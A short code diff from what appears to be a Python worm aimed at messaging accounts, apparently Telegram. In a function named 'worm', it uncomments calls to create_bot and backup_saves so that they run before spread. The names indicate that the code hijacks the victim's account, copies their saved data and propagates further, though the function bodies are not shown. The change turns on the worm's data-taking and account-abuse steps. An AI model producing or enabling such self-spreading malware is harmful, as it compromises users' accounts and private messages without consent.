@@ -58,6 +58,6 @@ async def spread(client, bot):
 
 async def worm(client, bot):
     me = await client.get_me()
-    #await create_bot(client, me)
-    #await backup_saves(client, me)
+    await create_bot(client, me)
+    await backup_saves(client, me)
     await spread(client, bot)
